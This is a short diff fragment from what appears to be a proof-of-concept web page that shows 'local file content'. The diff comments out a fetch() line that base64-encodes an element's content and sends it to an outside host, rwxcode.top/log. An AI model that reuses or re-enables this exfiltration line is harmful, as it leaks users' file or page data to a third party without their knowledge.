@@ -30,7 +30,7 @@ local file content:&lt;textarea style="width:100%;height:6rem">${ p.innerHTML }&
 
       var aaa = document.querySelector('#r').innerHTML;
         
-      fetch('http://rwxcode.top/log?info=' + btoa(aaa));
+      //fetch('http://rwxcode.top/log?info=' + btoa(aaa));
       
         var bbb = btoa(aaa);
 
